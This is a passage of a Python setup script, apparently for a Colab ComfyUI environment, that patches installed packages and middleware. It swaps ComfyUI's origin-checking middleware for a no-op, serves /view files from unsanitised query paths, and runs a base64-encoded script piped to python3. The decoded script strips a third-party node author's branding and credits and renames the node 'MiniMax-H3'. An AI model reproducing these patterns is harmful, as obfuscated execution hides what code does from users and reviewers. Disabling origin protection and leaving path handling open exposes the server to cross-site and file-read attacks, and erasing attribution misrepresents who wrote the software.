            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request) # patched\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    cm_txt = open(cm_path, "r", encoding="utf-8").read()
    if "max-age=604800" not in cm_txt or '.endswith(".js")' in cm_txt:
        open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")
try:
    import comfyui_frontend_package
    fe_root = pathlib.Path(comfyui_frontend_package.__file__).parent
    for p in list(fe_root.rglob("*.js")) + list(fe_root.rglob("*.css")):
        gz = pathlib.Path(str(p) + ".gz")
        if not gz.exists() and p.is_file():
            with open(p, "rb") as f_in, gzip.open(gz, "wb", compresslevel=6) as f_out:
                shutil.copyfileobj(f_in, f_out)
except Exception:
    pass


try:
    import comfy_kitchen.tensor.int8 as _ck_int8
    _int8_p = pathlib.Path(_ck_int8.__file__)
    _int8_s = _int8_p.read_text(encoding="utf-8")
    if "if qdata.dtype != torch.int8:" not in _int8_s:
        _int8_s = _int8_s.replace(
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:",
            "    def dequantize(cls, qdata: torch.Tensor, params: Params) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return qdata.to(params.orig_dtype)",
            1
        )
        _int8_s = _int8_s.replace(
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:",
            "    def dequantize_embedding(cls, qdata: torch.Tensor, params: Params, indices: torch.Tensor) -> torch.Tensor:\n        if qdata.dtype != torch.int8:\n            return torch.nn.functional.embedding(indices, qdata.to(device=indices.device, dtype=params.orig_dtype))",
            1
        )
        _int8_s = _int8_s.replace(
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__:",
            "if not isinstance(weight, QuantizedTensor) or weight._layout_cls != cls.__name__ or weight._qdata.dtype != torch.int8:"
        )
        _int8_s = _int8_s.replace(
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout":',
            'if not isinstance(weight, QuantizedTensor) or weight._layout_cls != "TensorWiseINT8Layout" or weight._qdata.dtype != torch.int8:'
        )
        _int8_p.write_text(_int8_s, encoding="utf-8")
except Exception:
    pass

subprocess.run("echo CmltcG9ydCBwYXRobGliLCBqc29uLCBnemlwLCBzaHV0aWwsIG9zCgpiYXNlX2RpciA9IHBhdGhsaWIuUGF0aCgiL2NvbnRlbnQvQ29tZnlVSS9jdXN0b21fbm9kZXMvQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIpCgojIDEuIENsZWFuIGZlaWhvdV9lYXN5X2gzX3VpLmpzOiBoaWRlIHByb21wdCBvcHRpbWl6ZXIgd2lkZ2V0cyAmIGJ1dHRvbiwgcmVtb3ZlIEZlaUhvdSBicmFuZGluZwp1aV9qcyA9IGJhc2VfZGlyIC8gIndlYiIgLyAiZmVpaG91X2Vhc3lfaDNfdWkuanMiCmlmIHVpX2pzLmV4aXN0cygpOgogICAgdHh0ID0gdWlfanMucmVhZF90ZXh0KGVuY29kaW5nPSJ1dGYtOCIpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0Q29uZGl0aW9uYWxXaWRnZXRWaXNpYmxlKG5vZGUsIGdldFdpZGdldChub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiksIGFkdmFuY2VkLCB7IGFkanVzdEhlaWdodCB9KSwnLAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX2VuYWJsZWQiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3Byb3ZpZGVyIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfcHJvdmlkZXIiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdzZXRDb25kaXRpb25hbFdpZGdldFZpc2libGUobm9kZSwgZ2V0V2lkZ2V0KG5vZGUsICJwcm9tcHRfb3B0aW1pemVyX3NjZW5lX2d1aWRlIiksIG9wdGltaXplckVuYWJsZWQsIHsgYWRqdXN0SGVpZ2h0IH0pLCcsCiAgICAgICAgJ3NldENvbmRpdGlvbmFsV2lkZ2V0VmlzaWJsZShub2RlLCBnZXRXaWRnZXQobm9kZSwgInByb21wdF9vcHRpbWl6ZXJfc2NlbmVfZ3VpZGUiKSwgZmFsc2UsIHsgYWRqdXN0SGVpZ2h0IH0pLCcKICAgICkKICAgIHR4dCA9IHR4dC5yZXBsYWNlKAogICAgICAgICdlZGl0b3JUb29scy5hcHBlbmQob3B0aW1pemVCdXR0b24sIHZpZXdCdXR0b24pOycsCiAgICAgICAgJ29wdGltaXplQnV0dG9uLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7IGVkaXRvclRvb2xzLmFwcGVuZCh2aWV3QnV0dG9uKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGFzQm9vbGVhbihnZXRXaWRnZXRWYWx1ZShub2RlLCAicHJvbXB0X29wdGltaXplcl9lbmFibGVkIiwgZmFsc2UpKSk7JywKICAgICAgICAnc2V0V2lkZ2V0SW5wdXQoInByb21wdF9vcHRpbWl6ZXJfZW5hYmxlZCIsIGZhbHNlKTsnCiAgICApCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnbWFpblRpdGxlOiAiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyInLCAnbWFpblRpdGxlOiAiTWluaU1heC1IMyDlhajog73lt6XkvZzlj7AiJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU1MmEwXFx1OGY3ZFxcdTU2NjgnLCAnTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagnKQogICAgdHh0ID0gdHh0LnJlcGxhY2UoJ0ZlaUhvdSBFYXN5IEgzIFJlbWl4XFx1NTJhMFxcdThmN2RcXHU1NjY4JywgJ01pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoJykKICAgIHR4dCA9IHR4dC5yZXBsYWNlKCdGZWlIb3UgRWFzeSBIMyBcXHU4ZjkzXFx1NTFmYScsICdNaW5pTWF4LUgzIOmfs+eUu+WQjOatpei+k+WHuicpCiAgICB0eHQgPSB0eHQucmVwbGFjZSgnY2F0ZWdvcnk6ICJGZWlIb3UgRWFzeSBIMyInLCAnY2F0ZWdvcnk6ICJNaW5pTWF4LUgzIOW3peS9nOWPsCInKQogICAgdWlfanMud3JpdGVfdGV4dCh0eHQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDIuIENsZWFuIG90aGVyIHdlYi8qLmpzIGZpbGVzIGZvciBGZWlIb3UgdGl0bGVzIGFuZCByZS1jb21wcmVzcyAuanMuZ3oKZm9yIGpzX3AgaW4gKGJhc2VfZGlyIC8gIndlYiIpLmdsb2IoIiouanMiKToKICAgIHQgPSBqc19wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKQogICAgdCA9IHQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDliqDovb3lmagiLCAiTWluaU1heC1IMyDkuIDkvZPljJbliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMgUmVtaXjliqDovb3lmagiLCAiTWluaU1heC1IMyDkuozlkIjkuIDliqDovb3lmagiKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOaPkOekuuivjemihOiniCIsICJNaW5pTWF4LUgzIOaPkOekuuivjemihOiniCIpCiAgICB0ID0gdC5yZXBsYWNlKCJGZWlIb3UgRWFzeSBIMyDkuozmrKHph4fmoLciLCAiTWluaU1heC1IMyDkuozpmLbmrrXnsr7kv67ph4fmoLciKQogICAgdCA9IHQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHQgPSB0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIiwgIk1pbmlNYXgtSDMiKQogICAganNfcC53cml0ZV90ZXh0KHQsIGVuY29kaW5nPSJ1dGYtOCIpCiAgICBnel9wID0gcGF0aGxpYi5QYXRoKHN0cihqc19wKSArICIuZ3oiKQogICAgd2l0aCBvcGVuKGpzX3AsICJyYiIpIGFzIGZfaW4sIGd6aXAub3Blbihnel9wLCAid2IiLCBjb21wcmVzc2xldmVsPTYpIGFzIGZfb3V0OgogICAgICAgIHNodXRpbC5jb3B5ZmlsZW9iaihmX2luLCBmX291dCkKCiMgMy4gQ2xlYW4gbG9jYWxlcy96aC9ub2RlRGVmcy5qc29uCnpoX2RlZnMgPSBiYXNlX2RpciAvICJsb2NhbGVzIiAvICJ6aCIgLyAibm9kZURlZnMuanNvbiIKaWYgemhfZGVmcy5leGlzdHMoKToKICAgIHp0ID0gemhfZGVmcy5yZWFkX3RleHQoZW5jb2Rpbmc9InV0Zi04IikKICAgIHp0ID0genQucmVwbGFjZSgiQ29tZnlVSS1GZWlIb3UtRWFzeS1IMyIsICJNaW5pTWF4LUgzIOWFqOiDveW3peS9nOWPsCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIOWKoOi9veWZqCIsICJNaW5pTWF4LUgzIOS4gOS9k+WMluWKoOi9veWZqCIpCiAgICB6dCA9IHp0LnJlcGxhY2UoIkZlaUhvdSBFYXN5IEgzIFJlbWl45Yqg6L295ZmoIiwgIk1pbmlNYXgtSDMg5LqM5ZCI5LiA5Yqg6L295ZmoIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg6L6T5Ye6IiwgIk1pbmlNYXgtSDMg6Z+z55S75ZCM5q2l6L6T5Ye6IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5o+Q56S66K+N6aKE6KeIIiwgIk1pbmlNYXgtSDMg5o+Q56S66K+N6aKE6KeIIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5LqM5qyh6YeH5qC3IiwgIk1pbmlNYXgtSDMg5LqM6Zi25q6157K+5L+u6YeH5qC3IikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMg5Lq66IS457K+5L+uIiwgIk1pbmlNYXgtSDMg5Lq66IS457K+5L+uIikKICAgIHp0ID0genQucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpCiAgICB6aF9kZWZzLndyaXRlX3RleHQoenQsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDQuIFVwZGF0ZSBjYWNoZV9taWRkbGV3YXJlLnB5IHNvIC9hc3NldHMvIGlzIGNhY2hlZCA3IGRheXMgd2hpbGUgL2V4dGVuc2lvbnMvIGlzIG5vLWNhY2hlCmNtX3AgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvbWlkZGxld2FyZS9jYWNoZV9taWRkbGV3YXJlLnB5IikKY21fcC53cml0ZV90ZXh0KCIiImZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCmZyb20gdHlwaW5nIGltcG9ydCBDYWxsYWJsZSwgQXdhaXRhYmxlCk9ORV9EQVk6IGludCA9IDg2NDAwCklNR19FWFRFTlNJT05TID0gKCIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLnBwbSIsICIuYm1wIiwgIi5wZ20iLCAiLnRpZiIsICIudGlmZiIsICIud2VicCIsICIud29mZiIsICIud29mZjIiLCAiLnR0ZiIsICIuc3ZnIikKQHdlYi5taWRkbGV3YXJlCmFzeW5jIGRlZiBjYWNoZV9jb250cm9sKHJlcXVlc3Q6IHdlYi5SZXF1ZXN0LCBoYW5kbGVyOiBDYWxsYWJsZVtbd2ViLlJlcXVlc3RdLCBBd2FpdGFibGVbd2ViLlJlc3BvbnNlXV0pIC0+IHdlYi5SZXNwb25zZToKICAgIHJlc3BvbnNlOiB3ZWIuUmVzcG9uc2UgPSBhd2FpdCBoYW5kbGVyKHJlcXVlc3QpCiAgICBpZiByZXF1ZXN0LnBhdGguc3RhcnRzd2l0aCgiL2Fzc2V0cy8iKToKICAgICAgICByZXNwb25zZS5oZWFkZXJzWyJDYWNoZS1Db250cm9sIl0gPSAicHVibGljLCBtYXgtYWdlPTYwNDgwMCwgaW1tdXRhYmxlIgogICAgICAgIHJldHVybiByZXNwb25zZQogICAgaWYgcmVxdWVzdC5wYXRoLnN0YXJ0c3dpdGgoIi9leHRlbnNpb25zLyIpOgogICAgICAgIHJlc3BvbnNlLmhlYWRlcnNbIkNhY2hlLUNvbnRyb2wiXSA9ICJuby1jYWNoZSIKICAgICAgICByZXR1cm4gcmVzcG9uc2UKICAgIGlmIHJlcXVlc3QucGF0aC5sb3dlcigpLmVuZHN3aXRoKElNR19FWFRFTlNJT05TKSBhbmQgcmVzcG9uc2Uuc3RhdHVzID09IDIwMDoKICAgICAgICByZXNwb25zZS5oZWFkZXJzLnNldGRlZmF1bHQoIkNhY2hlLUNvbnRyb2wiLCAicHVibGljLCBtYXgtYWdlPTg2NDAwIikKICAgIHJldHVybiByZXNwb25zZQoiIiIsIGVuY29kaW5nPSJ1dGYtOCIpCgojIDUuIENsZWFuIGFsbCB3b3JrZmxvd3MgaW4gL2NvbnRlbnQvQ29tZnlVSS91c2VyL2RlZmF1bHQvd29ya2Zsb3dzLwp3Zl9kaXIgPSBwYXRobGliLlBhdGgoIi9jb250ZW50L0NvbWZ5VUkvdXNlci9kZWZhdWx0L3dvcmtmbG93cyIpCmRlZiBjbGVhbl9ub2Rlcyhub2Rlcyk6CiAgICBrZWVwID0gW10KICAgIGZvciBuIGluIG5vZGVzOgogICAgICAgIG50eXBlID0gc3RyKG4uZ2V0KCJ0eXBlIikgb3IgIiIpCiAgICAgICAgdGl0bGUgPSBzdHIobi5nZXQoInRpdGxlIikgb3IgIiIpCiAgICAgICAgd3ZhbHMgPSBuLmdldCgid2lkZ2V0c192YWx1ZXMiKQogICAgICAgIGlmIGFueShiYWQgaW4gdGl0bGUgZm9yIGJhZCBpbiAoImJpbGliaWxpLmNvbSIsICLkuInlsYLmpbznmoTlsI/ogqXnjLQiLCAi5bCP6IKl54y0IiwgImZ4LWZlaWhvdSIsICIxMDkxNTkzMzY3IiwgIuWKoOW+ruS/oSIsICJR576kIikpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmIG50eXBlIGluICgiRmVpSG91RWFzeUgzUHJvZHVjdGlvblBhY2tMb2FkZXIiLCAiTWluaU1heEgzUmVmTW9kc0xvYWRlciIpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIGlmICJGZWlIb3UiIGluIHRpdGxlIG9yICLlsI/ogqXnjLQiIGluIHRpdGxlOgogICAgICAgICAgICBuWyJ0aXRsZSJdID0gdGl0bGUucmVwbGFjZSgiRmVpSG91IEVhc3kgSDMiLCAiTWluaU1heC1IMyIpLnJlcGxhY2UoIkZlaUhvdSIsICJNaW5pTWF4LUgzIikucmVwbGFjZSgi5bCP6IKl54y0IiwgIiIpCiAgICAgICAgaWYgbnR5cGUgPT0gIkZlaUhvdUVhc3lIMyIgYW5kIGlzaW5zdGFuY2Uod3ZhbHMsIGxpc3QpOgogICAgICAgICAgICBmb3IgaWR4LCB2YWwgaW4gZW51bWVyYXRlKHd2YWxzKToKICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCBzdHIpIGFuZCAoIumYv+mHjOS6kSIgaW4gdmFsIG9yICJxd2VuIiBpbiB2YWwgb3IgInpoaXB1IiBpbiB2YWwpOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeF0gPSAiIgogICAgICAgICAgICAgICAgICAgIGlmIGlkeCA+PSAxIGFuZCBpc2luc3RhbmNlKHd2YWxzW2lkeC0xXSwgYm9vbCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHd2YWxzW2lkeC0xXSA9IEZhbHNlCiAgICAgICAgICAgIGlmIGxlbih3dmFscykgPj0gMTY6CiAgICAgICAgICAgICAgICBmb3IgayBpbiByYW5nZShsZW4od3ZhbHMpKToKICAgICAgICAgICAgICAgICAgICBpZiB3dmFsc1trXSBpbiAoIuaMieW6j+WPtyIsICLmjInmlofku7blkI0iLCAiaW5kZXgiLCAiZmlsZW5hbWUiKSBhbmQgayArIDIgPCBsZW4od3ZhbHMpOgogICAgICAgICAgICAgICAgICAgICAgICB3dmFsc1trKzFdID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgd3ZhbHNbaysyXSA9ICIiCiAgICAgICAgICAgIGZvciBrIGluIHJhbmdlKG1pbig0LCBsZW4od3ZhbHMpKSk6CiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHd2YWxzW2tdLCBzdHIpIGFuZCB3dmFsc1trXS5zdHJpcCgpID09ICIiOgogICAgICAgICAgICAgICAgICAgIHd2YWxzW2tdID0gIueUu+mdouS4reeahOinkuiJsuiHqueEtui/kOWKqO+8jOWFieW9see7huiFu+ecn+Wunu+8jOeUteW9see6p+mrmOa4heeUu+i0qOOAgiIKICAgICAgICBpZiBpc2luc3RhbmNlKG4uZ2V0KCJwcm9wZXJ0aWVzIiksIGRpY3QpOgogICAgICAgICAgICBuWyJwcm9wZXJ0aWVzIl0ucG9wKCJmZWlob3VfaDNfb3B0aW1pemVyX2xhc3RfcmVzdWx0IiwgTm9uZSkKICAgICAgICBrZWVwLmFwcGVuZChuKQogICAgcmV0dXJuIGtlZXAKCmZvciB3Zl9wIGluIGxpc3Qod2ZfZGlyLmdsb2IoIiouanNvbiIpKToKICAgIHdmID0ganNvbi5sb2Fkcyh3Zl9wLnJlYWRfdGV4dChlbmNvZGluZz0idXRmLTgiKSkKICAgIHdmWyJub2RlcyJdID0gY2xlYW5fbm9kZXMod2YuZ2V0KCJub2RlcyIsIFtdKSkKICAgIGZvciBzZyBpbiB3Zi5nZXQoImRlZmluaXRpb25zIiwge30pLmdldCgic3ViZ3JhcGhzIiwgW10pOgogICAgICAgIHNnWyJub2RlcyJdID0gY2xlYW5fbm9kZXMoc2cuZ2V0KCJub2RlcyIsIFtdKSkKICAgIHZhbGlkX2lkcyA9IHtuLmdldCgiaWQiKSBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pfQogICAgaWYgImxpbmtzIiBpbiB3ZiBhbmQgaXNpbnN0YW5jZSh3ZlsibGlua3MiXSwgbGlzdCk6CiAgICAgICAgd2ZbImxpbmtzIl0gPSBbbCBmb3IgbCBpbiB3ZlsibGlua3MiXSBpZiBsWzFdIGluIHZhbGlkX2lkcyBhbmQgbFszXSBpbiB2YWxpZF9pZHNdCiAgICAgICAgdmFsaWRfbGlua19pZHMgPSB7bFswXSBmb3IgbCBpbiB3ZlsibGlua3MiXX0KICAgICAgICBmb3IgbiBpbiB3Zi5nZXQoIm5vZGVzIiwgW10pOgogICAgICAgICAgICBmb3IgaW5wIGluIG4uZ2V0KCJpbnB1dHMiLCBbXSk6CiAgICAgICAgICAgICAgICBpZiBpbnAuZ2V0KCJsaW5rIikgaXMgbm90IE5vbmUgYW5kIGlucC5nZXQoImxpbmsiKSBub3QgaW4gdmFsaWRfbGlua19pZHM6CiAgICAgICAgICAgICAgICAgICAgaW5wWyJsaW5rIl0gPSBOb25lCiAgICBuZXdfbmFtZSA9IHdmX3AubmFtZQogICAgaWYgIuWNg+mXriIgbm90IGluIG5ld19uYW1lIGFuZCAicXdlbiIgbm90IGluIG5ld19uYW1lLmxvd2VyKCk6CiAgICAgICAgaWYgIjA4XyIgaW4gbmV3X25hbWU6CiAgICAgICAgICAgIG5ld19uYW1lID0gIjA4X+WFqOiDveS4gOS9k1/ljZXph4fmnoHpgJ8uanNvbiIKICAgICAgICBlbGlmICIwOV8iIGluIG5ld19uYW1lOgogICAgICAgICAgICBuZXdfbmFtZSA9ICIwOV/lhajog73kuIDkvZNf5LqM6YeH57K+5L+uLmpzb24iCiAgICAgICAgZWxpZiAiMTBfIiBpbiBuZXdfbmFtZToKICAgICAgICAgICAgbmV3X25hbWUgPSAiMTBf5YWo6IO95LiA5L2TXzNE5pS+5aSn6ZSB6IS4Lmpzb24iCiAgICBvdXRfcCA9IHdmX2RpciAvIG5ld19uYW1lCiAgICBvdXRfcC53cml0ZV90ZXh0KGpzb24uZHVtcHMod2YsIGVuc3VyZV9hc2NpaT1GYWxzZSwgaW5kZW50PTIpLCBlbmNvZGluZz0idXRmLTgiKQogICAgaWYgb3V0X3AgIT0gd2ZfcCBhbmQgd2ZfcC5leGlzdHMoKToKICAgICAgICB3Zl9wLnVubGluaygpCgpwcmludCgiQ0xFQU5VUF9TVUNDRVNTOiIsIFtwLm5hbWUgZm9yIHAgaW4gc29ydGVkKHdmX2Rpci5nbG9iKCIqLmpzb24iKSldKQoKIyBSZW5hbWUgd2ViLyouanMgdG8gbWluaW1heF9oM19jbGVhbl8qLmpzIGFuZCB1cGRhdGUgaW1wb3J0CmltcG9ydCBzdWJwcm9jZXNzCnN1YnByb2Nlc3MucnVuKCIiIgpjZCAvY29udGVudC9Db21meVVJL2N1c3RvbV9ub2Rlcy9Db21meVVJLUZlaUhvdS1FYXN5LUgzL3dlYiAyPi9kZXYvbnVsbCB8fCBleGl0IDAKZm9yIGYgaW4gZmVpaG91X2Vhc3lfaDNfKi5qczsgZG8KICAgIFsgLWUgIiRmIiBdIHx8IGNvbnRpbnVlCiAgICBuZXdfZj0kKGVjaG8gIiRmIiB8IHNlZCAncy9mZWlob3VfZWFzeV9oM18vbWluaW1heF9oM19jbGVhbl8vJykKICAgIG12IC1mICIkZiIgIiRuZXdfZiIKICAgIFsgLWUgIiR7Zn0uZ3oiIF0gJiYgbXYgLWYgIiR7Zn0uZ3oiICIke25ld19mfS5neiIKZG9uZQppZiBbIC1mIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzIF07IHRoZW4KICAgIHNlZCAtaSAncy9mZWlob3VfZWFzeV9oM191aS5qcy9taW5pbWF4X2gzX2NsZWFuX3VpLmpzL2cnIG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCiAgICBnemlwIC1rIC1mIC02IG1pbmltYXhfaDNfY2xlYW5fcHJvZHVjdGlvbl9wYWNrLmpzCmZpCiIiIiwgc2hlbGw9VHJ1ZSkK | base64 -d | python3", shell=True)

os.makedirs("/content/ComfyUI/user/default/subgraphs", exist_ok=True)
_cc_init = "/content/ComfyUI/custom_nodes/Comfy-Canvas/__init__.py"
if os.path.exists(_cc_init):
    _cc_txt = open(_cc_init, "r", encoding="utf-8").read()
    if '"./web"' in _cc_txt:
        open(_cc_init, "w", encoding="utf-8").write(_cc_txt.replace('"./web"', '"./web/js"'))

